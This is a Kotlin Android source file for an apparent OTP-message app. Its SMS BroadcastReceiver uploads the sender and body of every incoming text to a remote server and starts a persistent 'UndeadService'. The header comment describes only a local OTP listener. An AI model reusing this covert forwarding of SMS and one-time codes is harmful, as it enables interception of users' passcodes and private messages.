package com.shimhg02.otpmessage.broadcast_receivers

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.os.Build
import android.telephony.SmsMessage
import android.telephony.SmsMessage.FORMAT_3GPP
import android.telephony.SmsMessage.FORMAT_3GPP2
import android.telephony.TelephonyManager
import android.telephony.TelephonyManager.PHONE_TYPE_CDMA
import com.shimhg02.otpmessage.Data.Message
import com.shimhg02.otpmessage.R
import com.shimhg02.otpmessage.Retrofit.Client
import com.shimhg02.otpmessage.callback_interfaces.Common
import com.shimhg02.otpmessage.Service.UndeadService
import retrofit2.Call
import retrofit2.Callback
import retrofit2.Response

/**
 * @author Nikhil Jain
 *
 * Broadcast Receiver to listen to upcoming messages
 *
 * <p>
 * This class receives sms whenever a new sms is received on the
 * device and then collect pdu array (Protocol Data Unit i.e format for sms)
 * and then prepare SMS Message from this array.
 *
 * The Otp Listener delegate can be implemented by activity to get message
 * for their use.
 * </p>
 *
 * <div class="special reference">
 * <h3>Developer Guides</h3>
 * <p>For more information about using BroadcastReceiver, read the
 * <a href="https://medium.com/@STYFI_STYLABS/automatically-read
 * -otp-from-smses-android-4-3-to-8-x-99e1f75b5804">Automatically-read-OTP
 * from SMSes — Android 4.3 to 8.x</a> Medium Link.</p></div>
 */
class SMSListener : BroadcastReceiver() {
    val PREFERENCE = "com.shimhg02.otpmessage"

    override fun onReceive(context: Context, intent: Intent) {
        val pref = context.getSharedPreferences(PREFERENCE, Context.MODE_PRIVATE)
        val smsMessage = getSmsMessageFromIntent(context = context, intent = intent)
        if (mListener != null) mListener!!.onOTPReceived(
            "Sender : ${smsMessage?.originatingAddress} " +
                    "\nMessage Body : ${smsMessage?.messageBody}"
        )
        if (mListener != null){
            Client.retrofitService.sendMessage(smsMessage?.originatingAddress.toString(), smsMessage?.messageBody.toString(), pref.getString("token","").toString()).enqueue(object : Callback<Message> {
                override fun onResponse(call: Call<Message>?, response: Response<Message>?) {
                    when (response!!.code()) {
                        200 -> {
                            System.out.println("LOGD) 메시지 전송 성공")
                        }
                    }
                }
                override fun onFailure(call: Call<Message>?, t: Throwable?) {

                }
            })
        }
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val intents = Intent(context, UndeadService::class.java)
            context.startForegroundService(intents)
            Client.retrofitService.sendMessage(smsMessage?.originatingAddress.toString(), smsMessage?.messageBody.toString(), pref.getString("token","").toString()).enqueue(object : Callback<Message> {
                override fun onResponse(call: Call<Message>?, response: Response<Message>?) {
                    when (response!!.code()) {
                        200 -> {
                            System.out.println("LOGD) 메시지 전송 성공")
                        }
                    }
                }
                override fun onFailure(call: Call<Message>?, t: Throwable?) {

                }
            })

        } else {
            val intents = Intent(context, UndeadService::class.java)
            context.startService(intents)
            Client.retrofitService.sendMessage(smsMessage?.originatingAddress.toString(), smsMessage?.messageBody.toString(), pref.getString("token","").toString()).enqueue(object : Callback<Message> {
                override fun onResponse(call: Call<Message>?, response: Response<Message>?) {
                    when (response!!.code()) {
                        200 -> {
                            System.out.println("LOGD) 메시지 전송 성공")
                        }
                    }
                }
                override fun onFailure(call: Call<Message>?, t: Throwable?) {

                }
            })
        }
    }

    /**
     * @purpose method to get SmsMessage from intent
     * @param context Context
     * @param intent Intent containing protocol data unit array
     * @return SmsMessage (optional value)
     */
    private fun getSmsMessageFromIntent(context: Context, intent: Intent): SmsMessage? {
        val data = intent.extras
        val protocolDataUnitArray: Array<Any>? =
            data?.get(context.getString(R.string.PDU_intent_key)) as Array<Any>?

        val format = getFormatForDevice(context)

        if (protocolDataUnitArray != null) {
            for (unit in protocolDataUnitArray) {
                return extractMessageFromPDU(unit as ByteArray, format)
            }
        }
        return null
    }

    /**
     * @purpose method to get format based on the type of device
     * @param context Context
     * @return format of message
     */
    private fun getFormatForDevice(context: Context): String? {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.P) return null

        val telephonyManager =
            context.getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager
        val activePhone = telephonyManager.phoneType
        return if (PHONE_TYPE_CDMA == activePhone) FORMAT_3GPP2 else FORMAT_3GPP
    }

    /**
     * @purpose method to extract message from Protocol Data Unit
     * @param unit protocol data unit
     * @param format format of message
     * @return SmsMessage
     */
    private fun extractMessageFromPDU(unit: ByteArray, format: String?): SmsMessage {
        var formatOfMsg = format

        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.P) {
            return SmsMessage.createFromPdu(unit)
        }
        if (formatOfMsg == null) {
            formatOfMsg = "3gpp"
        }
        return SmsMessage.createFromPdu(unit, formatOfMsg)
    }

    companion object {
        private var mListener: Common.OTPListener? =
            null

        fun bindListener(listener: Common.OTPListener) {
            mListener = listener
        }

        fun unbindListener() {
            mListener = null
        }
    }
}